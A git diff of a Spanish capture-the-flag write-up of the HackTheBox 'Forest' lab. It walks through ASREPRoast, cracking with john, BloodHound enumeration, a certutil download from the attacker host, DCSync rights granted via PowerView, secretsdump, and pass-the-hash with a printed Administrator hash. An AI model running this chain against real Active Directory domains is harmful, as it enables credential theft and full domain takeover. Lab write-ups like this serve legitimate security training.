@@ -17,9 +17,7 @@ tags:      [Easy,Windows,Kerberoasting,PowerView,ASREPRoast,BloodHound,SharpHoun
 
 ## Reconocimiento
 
-Fase inicial donde recolectamos toda la información posible del objetivo, utilizando 
-
-diferentes técnicas como:
+Fase inicial donde recolectamos toda la información posible del objetivo, utilizando diferentes técnicas como:
 
 | Caracter.                                   |
 |:--------------------------------------------|
@@ -42,17 +40,15 @@ sudo nmap --open -p- -Pn -n -vvv --min-rate 5000 -sS 10.10.10.161 -oG allports
 ```
 ![list](/assets/img/forest/Kali-2022-09-13-21-43-04.png){:.lead width="800" height="100" loading="lazy"}
 
+
+
 El paso anterior se debe hacer con privileguios (root).
 {:.note title="Attention"}
 
 ***
 ### Servicios y versiones
 
-Una vez sabemos que puertos estan abiertos con el comando anterior podremos saber que 
-
-versiones y servicios que corren en los mismo de ahi podremos determinara posibles 
-
-vulnerabilidades.
+Una vez sabemos que puertos estan abiertos con el comando anterior podremos saber que versiones y servicios que corren en los mismo de ahi podremos determinara posibles vulnerabilidades.
 
 Esto lo hacemos con el siguiente comando.
 
@@ -63,17 +59,15 @@ nmap -sCV p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,496
 
 ![list](/assets/img/forest/Kali-2022-09-13-21-45-55.png){:.lead width="800" height="100" loading="lazy"}
 
+
+
 El paso anterior no es nesesario ser (root).
 {:.note title="Attention"}
 
 ***
 ## Analisis de vulnerabilidades
 
-Con todos esos puetos abiertos es pisible asumir que estamos frente a un `Domain Controler`
-
-imediatamente lo que debemos hacer es tratar de explotar el smb,esto lo hacemos con 
-
-crackmapexec, smbclient,smbmap entre otros .
+Con todos esos puetos abiertos es pisible asumir que estamos frente a un `Domain Controler`imediatamente lo que debemos hacer es tratar de explotar el smb,esto lo hacemos con crackmapexec, smbclient,smbmap entre otros .
 
 Con crackmapexec vemos si el smb esta firmado ademas del dominio entre ota informacion.
 
@@ -96,9 +90,7 @@ smbclient -L 10.10.10.161 -N
 {:.note}
 Listamos los shares.
 
-Ya que esta el puero 53 abierto vamos a probar el ataque de domain zone transfer 
-
-`axfr`, esto lo hacemos con la herramienta dig.
+Ya que esta el puero 53 abierto vamos a probar el ataque de domain zone transfer `axfr`, esto lo hacemos con la herramienta dig.
 
 ![list](/assets/img/forest/Kali-2022-09-13-22-00-31.png){:.lead width="800" height="100" loading="lazy"}
 
@@ -116,27 +108,18 @@ dig @10.10.10.161 htb.local axfr
 {:.note}
 El ataque axfr no es posible seguimos con otra cosa.
 
-Exite varias herramentas que enumeran usauarios y grupos de smb y rcp, podemos usar 
-
-`lookupsid.py` y `rcpclient` pero ene ste caso utilizaremos `rcpclient`.
+Exite varias herramentas que enumeran usauarios y grupos de smb y rcp, podemos usar `lookupsid.py` y `rcpclient` pero ene ste caso utilizaremos `rcpclient`.
 
 ```bash
 rpcclient -U "" 10.10.10.161 -N
 ```
 
 {:.note}
-Ya que no tenemos usuarios aun lo hacemos con una null sesion, una ves dentro con 
-
-enumdomusers para usuarios y enumdomgroups para grupos.
+Ya que no tenemos usuarios aun lo hacemos con una null sesion, una ves dentro con enumdomusers para usuarios y enumdomgroups para grupos.
 
 
-Con los usuarios que obtubimos anteriormente podemos grepearlos o simplmente copiarlos y 
+Con los usuarios que obtubimos anteriormente podemos grepearlos o simplmente copiarlos y meterlos aun archivo txt llamado users.txt, y procedemos con el ataque ASREPRoast para esto podemos usar `kerbrute`, al caul al listado de usuario debemos agregarle el `@htb.local`, en este caso vamos usar [GetNPUsers.py].
 
-meterlos aun archivo txt llamado users.txt, y procedemos con el ataque ASREPRoast para esto 
-
-podemos usar `kerbrute`, al caul al listado de usuario debemos agregarle el `@htb.local`, 
-
-en este caso vamos usar [GetNPUsers.py].
 
 ![list](/assets/img/forest/Kali-2022-09-13-22-03-19.png){:.lead width="800" height="100" loading="lazy"}
 
@@ -146,6 +129,7 @@ rpcclient -U "" 10.10.10.161 -N -c "enumdomusers" | grep -oP "[.*?]" | grep -v "
 
 {:.note}
 Estamos agregando los usuarios a un diccionario users para proceder con el ataque [ASREPRoast].
+
 
 [ASREPRoast]: https://www.hackplayers.com/2020/11/asreproast-o-as-rep-roasting.html#:~:text=El%20ASREPRoast%20es%20una%20t%C3%A9cnica,requiere%20pre%2Dautenticaci%C3%B3n%20en%20kerberos.
 
@@ -167,12 +151,14 @@ john -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
 {:.note}
 La contraseña es`s3rvice` y el usuario es `svc-alfresco`.
 
+
 ***
 ## Explotacion
 
 Con cracmapexec verificamos si las credeciales son validas.
 
 ![list](/assets/img/forest/Kali-2022-09-13-23-09-14.png){:.lead width="800" height="100" loading="lazy"}
+
 
 ```bash
 crackmapexec smb 10.10.10.161 -u "svc-alfresco" -p "s3rvice"
@@ -208,13 +194,9 @@ La flag esta en el ecritorio del usuario no privilegiado.
 ***
 ## Escalacion de privilegios 
 
-Siempre es bueno ejecutar `WimEnum` Y `ADEnum` para monitorizar y ver los posibles 
+Siempre es bueno ejecutar `WimEnum` Y `ADEnum` para monitorizar y ver los posibles vectores para escalar de privilegios.
 
-vectores para escalar de privilegios.
-
-Podemos probar tambien kerberosting attack ya tenemos el dominio + un usuario + 
-
-una contraseña  podemos probar un ataque [Kerberosting].
+Podemos probar tambien kerberosting attack ya tenemos el dominio + un usuario + una contraseña  podemos probar un ataque [Kerberosting].
 
 [Kerberosting]: https://www.netwrix.com/cracking_kerberos_tgs_tickets_using_kerberoasting.html
 
@@ -227,13 +209,7 @@ GetUserSPNs.py htb.local/svc-alfresco -dc-ip 10.10.10.161 -request
 {:.note}
 No es posible el ataque.
 
-Con `ladapdoamindump` enumaremos los grupos, como el output que nos reporta suele 
-
-se mucho no crearemos otro direcctorio,y luego nos montaremos un servidor con 
-
-python y el cual desde el navegador podremos investigar bien sobre que usuario 
-
-pertenece a que grupo y que privilegios tienen etc.
+Con `ladapdoamindump` enumaremos los grupos, como el output que nos reporta suele se mucho no crearemos otro direcctorio,y luego nos montaremos un servidor con python y el cual desde el navegador podremos investigar bien sobre que usuario pertenece a que grupo y que privilegios tienen etc.
 
 ![list](/assets/img/forest/Kali-2022-09-13-23-23-27.png){:.lead width="800" height="100" loading="lazy"}
 
@@ -243,9 +219,7 @@ ldapdomaindump -u 'htb.local\svc-alfresco' -p 's3rvice' 10.10.10.161
 
 ![list](/assets/img/forest/Kali-2022-09-13-23-21-47.png){:.lead width="800" height="100" loading="lazy"}
 
-Utilizare bloodhound-python para recolectaar informacion.json para cargar en
-
-bloodhund. 
+Utilizare bloodhound-python para recolectaar informacion.json para cargar en bloodhund. 
 
 ![list](/assets/img/forest/Kali-2022-09-13-23-21-44.png){:.lead width="800" height="100" loading="lazy"}
 
@@ -254,16 +228,14 @@ bloodhund.
 bloodhound-python -c All -u 'svc-alfresco' -p 's3rvice' -ns 10.10.10.161 -d htb.local
 ```
 
-En este caso vamos a enumerar posibles vectores para escalar privileguios con bloodHound
+En este caso vamos a enumerar posibles vectores para escalar privileguios con bloodHound.
 
 ```bash
 neo4j console
 ```
 
 {:.note}
-Arrancamos neo4j que comparte un servicio por el puero 4747 y te loogeas si ya los 
-
-has hecho habres el bloodhound.
+Arrancamos neo4j que comparte un servicio por el puero 4747 y te loogeas si ya los has hecho habres el bloodhound.
 
 ```bash
 bloodhound &> /dev/null & disown
@@ -272,13 +244,9 @@ bloodhound &> /dev/null & disown
 {:.note}
 Independizamos el proceso.
 
-Otra opcion es con SharpHound recolectar la misma info atraves de la maquina victima 
 
-para esto debemos trasferir el binario a la maquina victima, desce la ubicacion del 
 
-binarion en ta maquina atacate levatamos un servidor web con pyton y en la maquina 
-
-victima hacemos el siguite comado.
+Otra opcion es con SharpHound recolectar la misma info atraves de la maquina victima para esto debemos trasferir el binario a la maquina victima, desce la ubicacion del binarion en ta maquina atacate levatamos un servidor web con pyton y en la maquina victima hacemos el siguite comado.
 
 ```bash
 certutil.exe -urlcache -split -f http://10.10.14.15/SharpHound.ps1 SharpHound.ps1
@@ -292,9 +260,7 @@ Import-Module .\SharpHound.ps1
 Invoke-BloodHound -CollectionMethod All
 ```
 
-Nos arroga un archivo.zip que luego no lo pasamos a la maquina atacate y de ahi lo 
-
-cargamos en el `bloodhound` para interpetar los datos.
+Nos arroga un archivo.zip que luego no lo pasamos a la maquina atacate y de ahi lo cargamos en el `bloodhound` para interpetar los datos.
 
 ![list](/assets/img/forest/Kali-2022-09-14-00-12-45.png){:.lead width="800" height="100" loading="lazy"}
 
@@ -310,8 +276,10 @@ Nos mustra ademas las acciones y coamdos que debemos tomar cara cosegirt el root
 
 ![list](/assets/img/forest/blood2.png){:.lead width="800" height="100" loading="lazy"}
 
+
 {:.note}
 A estos comandos les vamosa retocar un poquito.
+
 
 Creamos un usuario y contraseña para agregarlo al dominio 
 
@@ -346,9 +314,7 @@ Definimos las credenciales.
 $Cred = New-Object System.Management.Automation.PSCredential('htb.local\axel123', $SecPassword)
 ```
 
-Descargamos el binario de PowerView-ps1 y lo traemos a la maquina victima el cual 
-
-ejecuta la funcion para asignar el privilegio y estas credenciales al dominio.
+Descargamos el binario de PowerView-ps1 y lo traemos a la maquina victima el cual ejecuta la funcion para asignar el privilegio y estas credenciales al dominio.
 
 
 ![list](/assets/img/forest/Kali-2022-09-14-00-52-39.png){:.lead width="800" height="100" loading="lazy"}
@@ -365,11 +331,7 @@ Import-Module .\PowerView.ps1
 Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,dc=local" -PrincipalIdentity axel123 -Rights DCSync
 ```
 
-Una vez echo eso usaremos la herramienta [secretsdump.py], este script se encarga de realizar 
-
-un volcado completo de los SAM/LSA Secrets, credenciales cacheadas, información sensible 
-
-almacenada en el registro y los hashes NTLM del sistema.
+Una vez echo eso usaremos la herramienta [secretsdump.py], este script se encarga de realizar un volcado completo de los SAM/LSA Secrets, credenciales cacheadas, información sensible almacenada en el registro y los hashes NTLM del sistema.
 
 [secretsdump.py]: https://thehackerway.com/2021/05/24/network-hacking-con-impacket-parte-3/#:~:text=Volcado%20de%20%C2%ABWindows%20Secrets%C2%BB%20con,los%20hashes%20NTLM%20del%20sistema.
 
@@ -380,13 +342,7 @@ secretsdump.py htb.locat/axel123@10.10.10.161
 ```
 
 {:.note}
-Nos muestra los secretos de la mayoria de todos los usuarios peor elque nos 
-
-interesa en el de Administrator, con el cual podemos hacer pass de hash 
-
- `htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::` 
-
- para ingresar al usuario privilegiado de la siguiente manera.
+Nos muestra los secretos de la mayoria de todos los usuarios peor elque nos interesa en el de Administrator, con el cual podemos hacer pass de hash  `htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::` para ingresar al usuario privilegiado de la siguiente manera.
 
 {:.note}
 Para hacer pass de hash solo nos interesa el ultimo tercio del hash de administrator.
@@ -406,6 +362,7 @@ Comprobamos si las credenciales son validas para EvilWinRM.
 Ingresamos.
 
 ![list](/assets/img/forest/Kali-2022-09-14-01-13-39.png){:.lead width="800" height="100" loading="lazy"}
+
 
 {:.note}
 La flag esta en el ecritorio del usuario priviligiado.
